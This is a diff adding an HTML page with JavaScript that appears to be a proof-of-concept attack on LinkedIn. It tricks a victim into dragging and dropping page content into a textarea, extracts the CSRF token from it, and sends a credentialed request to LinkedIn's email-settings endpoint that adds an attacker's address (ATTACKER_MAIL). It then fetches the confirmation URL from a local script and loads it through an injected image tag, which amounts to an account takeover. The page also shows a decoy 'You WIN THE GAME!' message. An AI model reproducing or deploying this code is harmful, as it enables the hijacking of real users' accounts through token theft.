@@ -1,0 +1,89 @@
+<html>
+	<body>
+
+		<textarea align='center' style="position:fixed;top:30px" cols="50" rows="10" id="text" name="text" ondrop="getCsrfToken(event)"></textarea>
+				
+		<script>
+		
+			debug = true;
+			
+			function getCsrfToken(event) {
+		
+				event.preventDefault();
+				var html = event.dataTransfer.getData("Text");
+
+				var re = /ajax%3A\d{19}/;
+				var matchArray = re.exec(html);
+				
+				if(matchArray) {
+				
+					if(debug) alert('[DEBUG] csrf token is: ' + matchArray[0]);
+					
+					attackLinkedin(matchArray[0]);
+					return;
+					
+				}
+
+				alert('Try again!');
+				parent.location = '/linkedin/index.html'
+			}
+
+			function attackLinkedin(csrfToken) {
+			
+				var attackerEmail = 'ATTACKER_MAIL'; // Attacker's e-mail
+				
+				// Add a new e-mail to the profile
+				var request = genReq('POST', 'https://www.linkedin.com/settings/manage-email-submit');
+
+				if(request) {
+					request.withCredentials = 'true';
+					request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+					request.send('addEmail=' + attackerEmail + '&csrfToken=' + csrfToken + '&goback=.nas_*1_*1_*1');
+				}
+
+				// Wait the request to be computed (3 sec.), then check the attacker's box for the URL
+				setTimeout('getURLinAttackerBOX();', 3000);
+			}
+
+			function getURLinAttackerBOX() {
+
+				// Call the php script in order to check attacker's box for the LinkedIn URL
+				var request = genReq('GET', '/linkedin/linkedin.php');
+				
+				request.onreadystatechange = function() {
+					if(request.readyState == 4 && request.status == 200) {
+					
+						if(debug) alert('[DEBUG] URL is: ' + request.responseText);
+						
+						var url = request.responseText;
+						
+						// LinkedIn URL navigation will be followed by a redirection that must also be visited
+						document.write('<img src="' + url +'"/>');
+					}
+				}
+				
+				alert('Processing...');
+    			request.send(null);
+				alert('You WIN THE GAME!');
+				alert('Or not?');
+			}
+
+			function genReq(method, url) {
+			
+				var xhr = new XMLHttpRequest();
+				
+				if ("withCredentials" in xhr) {
+					xhr.open(method, url, true);
+				} else if (typeof XDomainRequest != "undefined") {
+					xhr = new XDomainRequest();
+					xhr.open(method, url);
+				} else {
+					xhr = null;
+				}
+				
+				return xhr;
+			}
+
+		</script>
+	</body>
+</html>
